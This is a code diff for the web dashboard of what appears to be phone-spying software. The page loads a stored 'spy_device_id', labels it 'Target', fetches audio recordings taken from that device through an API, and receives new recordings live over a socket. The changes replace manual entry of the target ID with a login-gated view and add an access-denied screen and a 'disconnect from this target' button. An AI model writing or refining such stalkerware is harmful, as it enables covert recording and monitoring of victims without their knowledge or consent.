@@ -89,38 +89,34 @@
             100% { box-shadow: 0 0 0 0 rgba(255, 59, 48, 0); }
         }
 
-        /* --- INPUT AREA --- */
-        .search-container {
+        /* --- DEVICE INFO BAR (NEW) --- */
+        .device-info-bar {
+            background: rgba(10, 132, 255, 0.1);
+            border: 1px solid rgba(10, 132, 255, 0.3);
+            padding: 10px 15px;
+            border-radius: 8px;
             display: flex;
-            gap: 10px;
+            justify-content: space-between;
+            align-items: center;
         }
 
-        input {
-            flex: 1;
-            background: #0d1117;
-            border: 1px solid var(--border);
-            padding: 12px;
-            border-radius: 8px;
-            color: white;
+        .device-id-display {
             font-family: monospace;
-            outline: none;
-            transition: 0.3s;
-        }
-
-        input:focus { border-color: var(--accent-blue); }
-
-        button.action-btn {
-            background: var(--accent-blue);
-            border: none;
-            color: white;
-            padding: 0 20px;
-            border-radius: 8px;
+            color: var(--accent-blue);
+            font-size: 1rem;
             font-weight: 600;
-            cursor: pointer;
-            transition: 0.2s;
         }
-        
-        button.action-btn:active { transform: scale(0.96); }
+
+        .logout-btn {
+            background: transparent;
+            border: 1px solid var(--border);
+            color: var(--text-muted);
+            padding: 5px 10px;
+            border-radius: 5px;
+            font-size: 0.75rem;
+            cursor: pointer;
+        }
+        .logout-btn:hover { background: rgba(255,255,255,0.1); color: white; }
 
         /* --- FILTERS --- */
         .filters {
@@ -128,7 +124,7 @@
             gap: 10px;
             overflow-x: auto;
             padding-bottom: 5px;
-            scrollbar-width: none; /* Hide scrollbar */
+            scrollbar-width: none;
         }
 
         .filter-pill {
@@ -206,12 +202,11 @@
         .details h4 { margin: 0; font-size: 0.95rem; font-weight: 500; }
         .details span { font-size: 0.75rem; color: var(--text-muted); }
 
-        /* Audio Player Styling */
         audio {
             width: 100%;
             height: 36px;
             border-radius: 20px;
-            filter: invert(1) hue-rotate(180deg); /* Dark Mode Audio Player */
+            filter: invert(1) hue-rotate(180deg);
             opacity: 0.8;
         }
 
@@ -222,9 +217,26 @@
             font-size: 0.9rem;
         }
 
+        /* Access Denied Overlay */
+        #accessDenied {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: #000;
+            z-index: 999;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
     </style>
 </head>
 <body>
+
+    <div id="accessDenied">
+        <h2 style="color: var(--accent-red);">ACCESS DENIED</h2>
+        <p style="color: var(--text-muted);">No Target ID Found.</p>
+        <button onclick="window.location.href='index.html'" style="padding: 10px 20px; background: var(--text-main); border: none; border-radius: 5px; cursor: pointer;">Go to Login</button>
+    </div>
 
     <div class="header">
         <div class="top-bar">
@@ -236,9 +248,12 @@
             </div>
         </div>
 
-        <div class="search-container">
-            <input type="text" id="deviceIdInput" placeholder="ENTER TARGET ID...">
-            <button class="action-btn" onclick="manualLoad()">LOAD</button>
+        <div class="device-info-bar">
+            <div style="display:flex; align-items:center; gap: 8px;">
+                <i class="fa-solid fa-mobile-screen" style="color:var(--text-muted)"></i>
+                <span id="displayDeviceId" class="device-id-display">Connecting...</span>
+            </div>
+            <button class="logout-btn" onclick="logout()">CHANGE</button>
         </div>
 
         <div class="filters">
@@ -251,7 +266,7 @@
     </div>
 
     <div class="container" id="recordingsList">
-        <div class="status-msg">Waiting for Target ID...</div>
+        <div class="status-msg">Verifying Target ID...</div>
     </div>
 
     <script>
@@ -260,20 +275,30 @@
         let currentFilter = 'All';
         let currentDeviceId = '';
         
-        // 🔥 AUTO LOAD LOGIC (Jesa Call History me tha)
+        // 🔥 MAIN LOGIC: Automatic Verify Check
         window.onload = () => {
+            // Check LocalStorage set by Parent/Login Page
             const savedID = localStorage.getItem('spy_device_id');
-            if (savedID) {
-                document.getElementById('deviceIdInput').value = savedID;
-                currentDeviceId = savedID;
-                fetchHistory(); // Page khulte hi load karega
-                joinSocketRoom(savedID); // Socket ko bhi bata do
+
+            if (!savedID) {
+                // Agar ID nahi hai, to Access Denied dikhao ya Login pe bhejo
+                document.getElementById('accessDenied').style.display = 'flex';
+                // Optional: Automatically redirect
+                // window.location.href = 'index.html'; 
+                return;
             }
+
+            // Agar ID hai, to set karo aur load karo
+            currentDeviceId = savedID;
+            document.getElementById('displayDeviceId').innerText = "Target: " + currentDeviceId;
+            
+            // Data Load shuru
+            fetchHistory();
+            joinSocketRoom(currentDeviceId);
         };
 
         // ✅ 1. LIVE SOCKET LISTENER
         socket.on('new-audio', (data) => {
-            // Sirf wahi dikhao jo selected ID ka ho
             if(currentDeviceId && data.device_id !== currentDeviceId) return;
 
             console.log("🔊 New Audio Received:", data);
@@ -288,32 +313,18 @@
 
             allRecordings.unshift(processed);
             render();
-            
-            // Notification sound play kar sakte ho yahan
         });
 
-        // ✅ 2. MANUAL LOAD BUTTON
-        function manualLoad() {
-            const inputVal = document.getElementById('deviceIdInput').value.trim().toUpperCase();
-            if(!inputVal) return alert("Enter Device ID!");
-            
-            currentDeviceId = inputVal;
-            localStorage.setItem('spy_device_id', currentDeviceId); // Save for next time
-            
-            fetchHistory();
-            joinSocketRoom(currentDeviceId);
-        }
-
-        // Socket Join Room (Optional, agar server pe room logic hai)
         function joinSocketRoom(id) {
             socket.emit('join', id);
         }
 
-        // ✅ 3. FETCH HISTORY API
+        // ✅ 2. FETCH HISTORY API
         async function fetchHistory() {
-            document.getElementById('recordingsList').innerHTML = `<div class="status-msg">Fetching Data...</div>`;
+            document.getElementById('recordingsList').innerHTML = `<div class="status-msg">Syncing Data for <span style="color:var(--accent-blue)">${currentDeviceId}</span>...</div>`;
 
             try {
+                // API Call
                 const res = await fetch(`/api/audio-history/${currentDeviceId}`);
                 const data = await res.json();
 
@@ -321,16 +332,16 @@
                     allRecordings = data.map(file => processCloudinaryFile(file));
                     render();
                 } else {
-                    document.getElementById('recordingsList').innerHTML = `<div class="status-msg">No recordings found for ${currentDeviceId}.</div>`;
+                    document.getElementById('recordingsList').innerHTML = `<div class="status-msg">No recordings found yet.</div>`;
                     allRecordings = [];
                 }
             } catch (e) {
                 console.error(e);
-                document.getElementById('recordingsList').innerHTML = `<div class="status-msg" style="color:red">Server Error!</div>`;
+                document.getElementById('recordingsList').innerHTML = `<div class="status-msg" style="color:var(--accent-red)">Connection Error! Server not responding.</div>`;
             }
         }
 
-        // ✅ 4. RENDER UI
+        // ✅ 3. RENDER UI
         function render() {
             const container = document.getElementById('recordingsList');
             container.innerHTML = '';
@@ -340,7 +351,7 @@
             );
 
             if(filtered.length === 0) {
-                container.innerHTML = `<div class="status-msg">No audio clips found.</div>`;
+                container.innerHTML = `<div class="status-msg">No audio clips found for this filter.</div>`;
                 return;
             }
 
@@ -373,6 +384,14 @@
 
         // --- HELPERS ---
 
+        function logout() {
+            // ID clear karke wapas login page pe bhejo
+            if(confirm("Disconnect from this target?")) {
+                localStorage.removeItem('spy_device_id');
+                window.location.href = 'index.html'; // Login page ka naam yahan likhna
+            }
+        }
+
         function processCloudinaryFile(file) {
             const d = new Date(file.created_at);
             return {
@@ -403,11 +422,8 @@
 
         function filterBy(filter, btnElement) {
             currentFilter = filter;
-            
-            // Toggle Active Class
             document.querySelectorAll('.filter-pill').forEach(btn => btn.classList.remove('active'));
             btnElement.classList.add('active');
-            
             render();
         }
 
